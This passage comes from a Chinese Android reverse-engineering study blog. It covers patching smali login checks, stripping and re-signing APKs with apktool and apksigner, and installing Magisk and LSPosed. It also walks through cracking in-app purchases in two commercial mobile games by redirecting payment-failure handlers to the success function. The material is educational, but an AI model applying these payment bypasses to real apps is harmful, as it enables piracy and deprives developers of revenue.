class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;用户信息&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;18sp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;20dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ResultActivity.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.selectwork;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResultActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_result);</span><br><span class="line">        <span class="comment">// 获取传递过来的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;NAME&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;AGE&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">birthday</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;BIRTHDAY&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;EMAIL&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">habit</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;HABIT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取显示数据的TextView</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示用户信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;姓名: &quot;</span> + name + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;年龄: &quot;</span> + age + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;生日: &quot;</span> + birthday + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;邮箱: &quot;</span> + email + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;爱好: &quot;</span> + habit;</span><br><span class="line"></span><br><span class="line">        resultTextView.setText(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册页面：</p>
<img src="/2026/01/08/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/3.png" class="" title="This is an example image">

<p>跳转页面：</p>
<img src="/2026/01/08/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/4.png" class="" title="This is an example image">

<h4 id="心理感受"><a href="#心理感受" class="headerlink" title="心理感受"></a><a href="#3">心理感受</a></h4><p>虽然是一个很小的登录页面，也是需要我去认真对待的，在这之间我遇到了很多问题，导致我并没有完成这个登录页面，也并没有完成课后的作业，直接就去看第二次课程的文档了，在第二次文档中，看见老师写的一些话，我很受触动，又返回继续写了。其实写完之后发现也就那样啊，没什么难的。</p>
<p>我觉得人的潜力是可以被突破的，千万不要自己局限住自己，当我们选择了逆向这条路，就注定不是一帆风顺的，我们要做好面对各种困难的准备，一定不要因为一些问题就放弃，这是我们成为大佬的必经之路！！！！</p>
]]></content>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(二)</title>
    <url>/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/</url>
    <content><![CDATA[<h2 id="安卓逆向学习笔记（二）"><a href="#安卓逆向学习笔记（二）" class="headerlink" title="安卓逆向学习笔记（二）"></a>安卓逆向学习笔记（二）</h2><p><a href="https://www.52pojie.cn/thread-650395-1-1.html">安卓逆向第二课</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">学习过程</a></li>
<li><a href="#2">课后作业</a></li>
<li><a href="#3">心理感受</a></li>
</ul>
<hr>
<h4 id="学习过程"><a href="#学习过程" class="headerlink" title="学习过程"></a><a href="#1">学习过程</a></h4><p>orz 昨天写完了但是忘记保存了，无奈再复习一遍。</p>
<p>在我将我写的文件拖进<code>AK（Android Skiller）</code>后，我发现在该软件上显示<code>Mainactivity</code>丢失，这里我们需要注意：</p>
<ol>
<li>下载好AK之后，我们需要将apktool换成最新版，在AK中apktool出现在两个地方，一个是根目录下的<code>apktool</code>，一个在Bin文件夹中，这两个都需要换。</li>
<li>我们需要确定我们的apk文件是导出是正确的，就是因为我的apk文件导出不正确，所以在AK中我的文件才会出现错误。（求自己细心一点orz）。<a href="https://blog.csdn.net/m0_74353785/article/details/148535565">如何在Android Studio中导出apk文件_android studio导出apk文件</a>如果你不会导出apk文件，可以看看这篇文档。</li>
</ol>
<p>以上算是我们的准备阶段，因为只有打开软件且他能用，我们才能开始我们的下一步。</p>
<p>我们反编译完成之后，可以看到有一个入口点的链接，我们打开入口点。</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/1.png" class="" title="This is an image">

<p>点击之后，我们就可以看见我们的代码了。</p>
<p>我们的目的是：当我们输入错误的账号与密码时，我们也可以登录上去。那么其实比较重要的就是<code>check</code>函数了，我们看一下check函数长什么样子。</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/2.png" class="" title="This is an image">

<p>我并没有将整个的check函数全部截图，其实重要的就是我圈住的代码，这是代码判断的逻辑，我们说一下重要的比较方法。</p>
<ul>
<li><code>if-eqz</code>：当<code>p1=0</code>时，执行<code>cond_0</code>中的代码，反之，如果<code>p1=1</code>时，就执行下面的代码。</li>
<li><code>if-nez</code>：当<code>p1=1</code>时，执行<code>cond_0</code>中的代码，反之，如果<code>p1=0</code>时，执行下面的代码。</li>
</ul>
<p>那么我们知道这个方法之后，代码的逻辑就很清楚了，当我们输入正确的用户名和密码之后就会登录成功，当我们输入不正确的用户名和密码时，就会登录失败。</p>
<ul>
<li><code>cond_0</code>：就是执行登录失败的代码。</li>
<li>如果一直往下执行不跳转，就会登录成功。</li>
</ul>
<p>为了实现我们的目的（即当我们输入不正确的用户名与密码时也可以登录成功），我们有三种方法（老师给的）：</p>
<ol>
<li>将<code>if-eqz</code>改成<code>if-nez</code>，原来是输入错误才会跳转<code>cond_0</code>，改之后，输入成功就会跳转<code>cond_0</code>，也就是说，我们输入正确的用户名和，密码反而会登录失败。</li>
<li>将两句判断<code>if-eqz</code>注释或者删掉，我们没有跳转之后，会一直向下执行，最终登录成功。</li>
<li>使用<code>goto</code>进行无条件跳转。</li>
</ol>
<p>我自己当时在想，如果将登录失败的unicode码改成登录成功的unicode码是不是也可以？</p>
<p>答案是不可以，我来说一下原因：</p>
<ol>
<li>修改unicode仅仅是修改表示，内部逻辑并没有变，所以这种方法是错误的。</li>
<li>联想实际不难理解，如果我们输错密码了，虽然显示的是登录成功，但是我们的界面还是登录失败的界面。这是因为内部逻辑没有改变，在一些reverse题中，有时会这样迷惑你。</li>
</ol>
<p>ok，我们来展示一下这三种方法的代码。</p>
<ol>
<li><p>将<code>if-eqz</code>改成<code>if-nez</code></p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/3.png" class="" title="This is an image">
</li>
<li><p>将两句判断<code>if-eqz</code>注释或者删掉</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/4.png" class="" title="This is an image">
</li>
<li><p>使用<code>goto</code>进行无条件跳转</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/5.png" class="" title="This is an image"></li>
</ol>
<p>第三种方法需要注意：<code>goto</code>需要写在<code>const/4 v0 0*0</code>,这是因为需要先声明变量，如果直接在<code>method</code>下面写<code>goto</code>，就会导致找不到变量从而发生错误。</p>
<p>最后当我们输入错误时候确实是显示的输入正确，这里我不在放截图了。</p>
<h4 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a><a href="#2">课后作业</a></h4><p>课后作业是将滚动的天空设置成无限球版，我看的教程是老师给的其他大佬的文档<a href="https://www.52pojie.cn/thread-632178-1-1.html">安卓游戏内购破解之滚动的天空</a>。写这个作业的时候，遇到了非常多的问题，我们边写边说。</p>
<p>首先是下载原版的apk文件，这个文件版本太老了（8年前的版本），那时候的是32位的，但是不知道为什么在32位模拟器也打不开，其他版本的话，虽然能打开，但是不知道为啥不能购买，点击购买毫无反应，很神奇，但是也学了很多东西的。</p>
<p>我是使用老师给的版本18年的版本好像，在我们修改代码前，我们需要注意：</p>
<ol>
<li>文件是有签名的，但是我们是没有这个签名的，但是没有签名就不能导出apk文件，那么我们就要想办法绕过这个签名。</li>
<li>怎么绕过签名？</li>
</ol>
<p>我们用最简单的办法吧（一天都花费在了怎么绕过签名上，最后问大佬才知道orz）</p>
<ol>
<li><p>使用<code>apktool</code>将文件解包。（我的apk文件路径是<code>E:\liulanqi\rollsky\rollsky.apk</code>）</p>
<p><strong>解包命令：</strong> </p>
<p><code>apktool d &quot;E:\liulanqi\rollsky\rollsky.apk&quot; -o &quot;E:\liulanqi\rollsky\rollsky_decoded&quot;</code></p>
</li>
<li><p>删除签名，进入<code>rollsky_decoded</code>的目录，删除<code>META-INF</code>文件夹。</p>
</li>
<li><p>重新打包。</p>
<p><strong>打包命令：</strong> </p>
<p><code>apktool b &quot;E:\liulanqi\rollsky\rollsky_decoded&quot; -o &quot;E:\liulanqi\rollsky\rollsky-unsigned.apk&quot;</code> </p>
</li>
<li><p>加签名。（我的签名路径是<code>D:\Key.store</code>）</p>
<p><strong>加签名命令：</strong> </p>
<p><code>apksigner sign --ks &quot;D:\Key.store&quot; --ks-key-alias &quot;key0&quot; --out &quot;E:\liulanqi\rollsky\rollsky-signed.apk&quot; &quot;E:\liulanqi\rollsky\rollsky-unsigned.apk&quot;</code></p>
<ul>
<li>Key0是我签名的别名</li>
<li><code>apksighner</code>是AndroidSkiller中的工具，进入这个工具目录使用该命令即可。</li>
</ul>
</li>
</ol>
<p>到这一步我们可以将文件拖入<code>Android Skiller</code>中进行反编译了。</p>
<p>因为当我们支付失败时有<code>支付失败</code>的提示，在上面的练习中，我们知道反编译之后，文字是以<code>unicode</code>形式表示的，我们搜一下知道支付失败的unicode的编码是<code>\u652f\u4ed8\u5931\u8d25</code>，我们可以搜索一下字符串。</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/6.png" class="" title="This is an image">

<p>搜索完成后，有三个文件都出现了这个字符串，我们发现第三个文件就是我们需要修改的文件。</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/7.png" class="" title="This is an image">

<p>在字符串中我们可以大概了解到，里面应该是有支付成功和失败的逻辑的，聪明的我们立刻就能想到可以将支付成功的代码覆盖到支付失败上。</p>
<img src="/2026/01/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/8.png" class="" title="This is an image">

<p>可以看到，我们程序的逻辑就彻底改变了，不管支付取消还是支付失败最终都是支付成功。</p>
<p>修改之后我们就可以将文件导出apk文件，编译时选择我们加签名那一步的签名（key0），那么这个作业就结束了。</p>
<h4 id="心理感受"><a href="#心理感受" class="headerlink" title="心理感受"></a><a href="#3">心理感受</a></h4><p>这个作业让我感受到了逆向其实是很有意思的，能切实体会到自己究竟在干啥，之前我一直都是在刷CTF的逆向题，感觉实战更有意思。</p>
<p>虽然最后apk文件运行不了，但是也学到了很多东西。加油！！！</p>
]]></content>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(三)</title>
    <url>/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/</url>
    <content><![CDATA[<h2 id="安卓逆向学习笔记-三"><a href="#安卓逆向学习笔记-三" class="headerlink" title="安卓逆向学习笔记(三)"></a>安卓逆向学习笔记(三)</h2><p><a href="https://www.52pojie.cn/thread-654654-1-1.html">安卓逆向第三课</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">切水果游戏</a><ul>
<li><a href="#1.1">第一种方法</a></li>
<li><a href="#1.2">第二种方法</a></li>
<li><a href="#1.3">第三种方法</a></li>
</ul>
</li>
<li><a href="#2">作业</a></li>
</ul>
<hr>
<h4 id="切水果游戏"><a href="#切水果游戏" class="headerlink" title="切水果游戏"></a><a href="#1">切水果游戏</a></h4><p><strong>原apk文件：</strong> 通过网盘分享的文件：cut_fruit.apk<br>链接: <a href="https://pan.baidu.com/s/1w0AvkaUB-dHTnQgdlcGT8g">https://pan.baidu.com/s/1w0AvkaUB-dHTnQgdlcGT8g</a> 提取码: yjkb</p>
<h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a><a href="#1.1">第一种方法</a></h5><p>我们下载好文件之后，需要考虑一个问题，也是我在笔记二中踩坑很久的问题。</p>
<p>因为我们修改完apk之后是要根据签名去编译的，所以在开始修改文件之前，我们需要对文件进行一些操作。</p>
<ol>
<li>解包文件</li>
<li>删除签名文件（<code>META-INF</code>）</li>
<li>打包</li>
<li>加签名</li>
</ol>
<p>这些在我的第二篇文章中有具体命令，但是在这里我还要说一下，如果说显示内部没有该命令，我们进行第1，3步骤时，可以这样做：</p>
<ol>
<li><p><strong>解包：</strong> 使用命令<code>java -jar D:\ruanjian\apktool\apktool_2.12.1.jar d &quot;D:\ruanjian\cut fruit\cut_fruit.apk&quot; -o &quot;D:\ruanjian\cut fruit\cut_fruit_d.apk&quot;</code></p>
</li>
<li><p><strong>打包：</strong> 使用命令<code>java -jar D:\ruanjian\apktool\apktool_2.12.1.jar b &quot;D:\ruanjian\cut fruit\cut_fruit_d.apk&quot; -o &quot;D:\ruanjian\cut fruit\cut_fruit_dns.apk&quot;</code></p>
</li>
<li><p><strong>加签名：</strong> 我们进入AS文件夹下的<code>D:\AndroidTools\SDK\build-tools\35.0.0</code></p>
<p><strong>使用命令：</strong> <code>apksigner sign --ks &quot;D:\Key.store&quot; --ks-key-alias &quot;key0&quot; --out &quot;D:\ruanjian\cut fruit\cut_fruit_ds.apk&quot; &quot;D:\ruanjian\cut fruit\cut_fruit_dns.apk&quot;</code></p>
</li>
</ol>
<p>这些是我们开始的前提条件，我们打开原版文件看看软件打开是什么样子的。</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/1.png" class="This is an example image">

<p>这是购买界面，当我们点击购买时会出现</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/2.png" class="This is an example image">

<p>我们可以判断在代码中可能也会有 **支付失败 ** 字段，我们将该apk文件拖入AS中进行反编译</p>
<p>我们使用<a href="https://www.jyshare.com/front-end/3602/">在线 Unicode 编码转换 | 菜鸟工具</a>得到支付失败的unicode编码是<code>\u652f\u4ed8\u5931\u8d25</code></p>
<p>在AS中进行搜索，发现</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/3.png" class="This is an example image">

<p>很奇怪，字段不是支付失败，可能是其他的？那我们直接搜失败吧</p>
<p>失败的unicode编码是<code>\u5931\u8d25</code></p>
<p>在AS中搜索<code>\u5931\u8d25</code></p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/4.png" class="This is an example image">

<p>经过我一个一个检查，我发现框住部分是有用的（购买失败）。</p>
<p>在这个函数中，有支付成功，支付失败，支付取消这三种逻辑。我们的目的就是无论是支付取消还是支付失败，都是支付成功的效果。</p>
<p>在这个和第二篇笔记的思路一样，因为不太理解函数内部实现逻辑，所以直接将支付成功的代码，粘贴到支付取消，支付失败的函数中。</p>
<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a><a href="#1.2">第二种方法</a></h5><p>第二种方法是老师的方法，找到调用购买失败函数的函数，将调用的这个函数都改成购买成功的函数就可以了。</p>
<p>我这样说可能很难理解，我们看一下代码就非常清晰了。</p>
<p>我们先搜索购买失败这个函数，也就是<code>payResultFalse</code>函数</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/5.png" class="This is an example image">

<p>红框圈住的分别是三个分支：</p>
<ol>
<li>购买取消</li>
<li>购买成功</li>
<li>购买失败</li>
</ol>
<p>看smali代码很难理解，我们可以看看它的java源码。我的AS不知道为什么不能转换，但是没关系，我们可以使用jadx查看源码</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/6.png" class="This is an example image">

<p>很明显，这里老师的思路就是：无论<code>resultCode</code>是多少，我们调用的都是<code>payResultSuccess</code>函数。</p>
<p>非常好办，直接将红框中的函数都替换 <code>payResultSuccess</code>函数：</p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/7.png" class="This is an example image">

<p>改成这样就ok了。</p>
<h5 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a><a href="#1.3">第三种方法</a></h5><p>我想到的方法是将失败函数与成功函数名进行对调，但是貌似不可以</p>
<p><strong>看一下破解后的游戏界面</strong></p>
<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/8.png" class="This is an example image">

<img src="/2026/01/27/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/9.png" class="This is an example image">

<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a><a href="#2">作业</a></h4><p>作业的apk文件我下载的都有点问题，暂时先将这个部分跳过，有机会再写。</p>
]]></content>
      <tags>
        <tag>安卓逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(四)</title>
    <url>/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/</url>
    <content><![CDATA[<h2 id="Android逆向学习笔记-四"><a href="#Android逆向学习笔记-四" class="headerlink" title="Android逆向学习笔记(四)"></a>Android逆向学习笔记(四)</h2><p><a href="https://www.52pojie.cn/thread-1695141-1-1.html">《安卓逆向这档事》一、模拟器环境搭建</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">搭建过程</a></li>
<li><a href="#2">心理感受</a></li>
</ul>
<hr>
<h4 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a><a href="#1">搭建过程</a></h4><h5 id="1-下载雷电模拟器"><a href="#1-下载雷电模拟器" class="headerlink" title="1. 下载雷电模拟器"></a>1. 下载雷电模拟器</h5><p>可以从官网下载<a href="https://www.ldmnq.com/">雷电模拟器官网_安卓模拟器_手游模拟器下载</a></p>
<h5 id="2-更改雷电模拟器设置"><a href="#2-更改雷电模拟器设置" class="headerlink" title="2. 更改雷电模拟器设置"></a>2. 更改雷电模拟器设置</h5><img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/1.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/2.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/3.png" class="" title="This is an example image">

<p>保存完设置之后，重启</p>
<h5 id="3-安装面具"><a href="#3-安装面具" class="headerlink" title="3. 安装面具"></a>3. 安装面具</h5><p>通过网盘分享的文件：app-debug.apk<br>链接: <a href="https://pan.baidu.com/s/1Y5kDgnliFIinn6fCuUXIBA">https://pan.baidu.com/s/1Y5kDgnliFIinn6fCuUXIBA</a> 提取码: ijv8</p>
<p>将这个apk文件拖入到雷电模拟器中</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/4.png" class="" title="This is an example image">

<p>允许之后点击Magisk后面的安装</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/5.png" class="" title="This is an example image">

<p>点击允许之后</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/6.png" class="" title="This is an example image">

<p><strong>注意到这个界面之后一定要退回！！</strong></p>
<p>退回之后再次点击进入文件</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/7.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/8.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/9.png" class="" title="This is an example image">

<p>选择之后点击开始</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/10.png" class="" title="This is an example image">

<p>出现这个界面之后就成功了，<strong>重启</strong> 雷电模拟器，我们点击面具</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/11.png" class="" title="This is an example image">

<p>点击设置</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/12.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/13.png" class="" title="This is an example image">

<p>通过网盘分享的文件：LSPosed-v1.9.2-7024-zygisk-release.zip<br>链接: <a href="https://pan.baidu.com/s/1kxi5IFHz37cpa1KRxYZQ9w">https://pan.baidu.com/s/1kxi5IFHz37cpa1KRxYZQ9w</a> 提取码: 3mhu</p>
<p>打开共享文件夹之后选择电脑文件夹，将<code>LSPosed-v1.9.2-7024-zygisk-release.zip</code>放到里面</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/14.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/15.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/16.png" class="" title="This is an example image">

<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/17.png" class="" title="This is an example image">

<p>点击这个模块</p>
<img src="/2026/02/01/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/18.png" class="" title="This is an example image">

<p>ok</p>
<p>我们重启雷电模拟器，打开面具之后，当我们打开模块之后显示这个模块，就安装成功了。</p>
<h4 id="心理感受"><a href="#心理感受" class="headerlink" title="心理感受"></a><a href="#2">心理感受</a></h4><p>安装面具的时候出了一点小问题，我只打开了root权限，我并没有开读写权限，导致我一直失败，其实老师的教程里面有这个答疑，但是当时我是直接去搜的，虽然也解决了这个问题，但是如果当时仔细看老师的教程，会节省很长的时间。</p>
<p>orz</p>
]]></content>
      <tags>
        <tag>安卓逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(五)</title>
    <url>/2026/02/03/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/</url>
    <content><![CDATA[<h2 id="Android逆向学习笔记-五"><a href="#Android逆向学习笔记-五" class="headerlink" title="Android逆向学习笔记(五)"></a>Android逆向学习笔记(五)</h2><p><a href="https://www.52pojie.cn/thread-1695796-1-1.html#44239142_%E4%BA%8C%E3%80%81%E5%B7%A5%E5%85%B7">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">APK文件的基本结构</a></li>
<li><a href="#2">APK双开原理及操作</a></li>
<li><a href="#3">汉化APK</a></li>
<li><a href="#4">初识AndroidManifest.xml</a></li>
<li><a href="#5">更改图标与文件名</a></li>
<li><a href="#6">课后作业</a></li>
</ul>
<hr>
<h4 id="APK文件的基本结构"><a href="#APK文件的基本结构" class="headerlink" title="APK文件的基本结构"></a><a href="#1">APK文件的基本结构</a></h4><p>apk文件实际上是一个标准的zip格式压缩文件，它的结构是：</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>assets目录</td>
<td>存放APK的静态资源文件，比如视频，音频，图片等等</td>
</tr>
<tr>
<td>lib目录</td>
<td>armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>
</tr>
<tr>
<td>MATE-INF目录</td>
<td>保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK文件的身份证（验证文件是否被修改）</td>
</tr>
<tr>
<td>res目录</td>
<td>res目录存放资源文件，包括图片，字符串等等，APK的脸蛋（图标）也由它的layout设计</td>
</tr>
<tr>
<td>AndroidManifest.xml文件</td>
<td>APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等信息</td>
</tr>
<tr>
<td>classes.dex文件</td>
<td>classes.dex是Java源码编译后生成的java字节码文件，APK文件运行的主要逻辑</td>
</tr>
<tr>
<td>resources.arsc文件</td>
<td>resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和Id，通过R文件中的Id就可以找到对应的资源</td>
</tr>
</tbody></table>
<p>asset和lib目录不一定有，但是是比较常见的。</p>
<p>其实这里我是有一些疑问的：</p>
<ol>
<li><p><mark>asset目录与res目录里面都存放图片等信息，里面的图片有什么区别吗？</mark></p>
<p>两者是有区别的，res目录里存放的是UI图片（用户界面的图片，eg：按钮图片，背景图片），asset目录放的是内容图片（eg：角色，地图）</p>
</li>
